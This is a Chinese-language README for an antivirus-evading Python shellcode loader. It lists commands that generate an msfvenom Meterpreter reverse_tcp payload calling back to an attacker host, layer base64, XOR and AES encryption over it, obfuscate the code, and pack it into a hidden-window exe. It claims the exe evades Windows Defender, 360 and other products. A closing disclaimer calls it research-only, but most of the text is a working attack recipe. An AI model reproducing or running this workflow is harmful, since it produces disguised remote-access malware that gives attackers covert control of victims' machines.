# python-shellcode-loader

<a name="ptTMq"></a>
## 简单介绍
免杀方式 msfvenom生成raw格式的shellcode-->base64-->XOR-->AES<br />将python代码缩小并混淆最后生成exe<br />目前过DF、360和火绒  virustotal：7/66过卡巴斯基、迈克菲等
<a name="H2jnt"></a>
## 获取项目
git clone https://github.com/HZzz2/python-shellcode-loader.git

cd python-shellcode-loader

pip install -r .\requirements.txt

## 生成shellcode
#生成shellcode<br />`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=9999 -f raw > rev.raw`
<a name="rNUTI"></a>
## base64编码shellcode并替换jiami.py中的值
#base64<br />`base64 -w 0 -i rev.raw > rev.bs64`<br />`cat rev.bs64`<br />复制base64的值替换jiami.py中payload       也就是 第二十五行 sc='payload' 
<a name="uXwYU"></a>
## 加密base64并替换main.py中的值
#加密base64后的shellcode<br />`python3 jiami.py`<br />#会生成一个aes-xor.txt的文件，复制文件里的值(经过XOR和AES加密后)<br />复制的值替换main.py中的payload   也就是第四十一行 jiami_sc='payload'
<a name="RhzZp"></a>
## 缩小和混淆py代码
<a name="K5dP3"></a>
### 缩小python代码
`pyminify main.py --output main-mini.py`
<a name="PTqkf"></a>
### 混淆main-mini.py中的python代码
[https://pyob.oxyry.com/](https://pyob.oxyry.com/)  在线混淆<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/26697321/1654524591386-7385c972-05e4-4761-bac3-311ae4ab2b0c.png#clientId=ufd1019e1-55bc-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=531&id=u32a8913b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=664&originWidth=1919&originalType=binary&ratio=1&rotation=0&showTitle=false&size=192572&status=done&style=none&taskId=uf5d03036-4fc8-4141-aec3-77143fc268e&title=&width=1535.2)<br />将混淆后的代码保存到一个文件中，比如文件名为:main-mini-ob.py
<a name="s0SXj"></a>
## 打包成可执行文件exe
#打包成exe<br />`pyinstaller.exe -Fw -i .\setting.ico --key=leslie .\main-mini-ob.py`<br />-F 打包为单文件 -w 不显示窗口   -i ico图标文件  --key  加密字节码的密钥<br />等待打包完成。。。。<br />打包好后的可执行程序在dist目录中
<a name="dr6Hv"></a>
## 流程图
![](https://cdn.nlark.com/yuque/0/2022/jpeg/26697321/1654524239719-d5ff881a-602c-4508-81b8-8e14c0d41595.jpeg)
<a name="SyXYB"></a>
## 检测图


### DF
![image](https://user-images.githubusercontent.com/22775890/172209887-134b5107-353b-45e2-a3b6-9e65b5189b8c.png)


### 火狐
![image](https://user-images.githubusercontent.com/22775890/172209706-1634bd75-7fe4-4844-bf95-bb8e3dea0540.png)


### 360杀毒
![image](https://user-images.githubusercontent.com/22775890/172209912-86663b43-9afe-40ec-ba1a-dd6951f04ac3.png)


### 360安全卫士云查杀
![image](https://user-images.githubusercontent.com/22775890/172209928-b96f0201-2b4d-4efb-bf4c-33df8ed3ce03.png)


### virustotal
![image](https://user-images.githubusercontent.com/22775890/172209945-6aa0f8d1-dbe2-443d-9bf1-b127fe271aa9.png)


https://user-images.githubusercontent.com/22775890/172209225-080c2549-45cc-4135-a907-38738ab42df5.mp4



## 免责声明
仅供安全研究与教学之用，如果使用者将其做其他用途，由使用者承担全部法律及连带责任，本人不承担任何法律及连带责任。











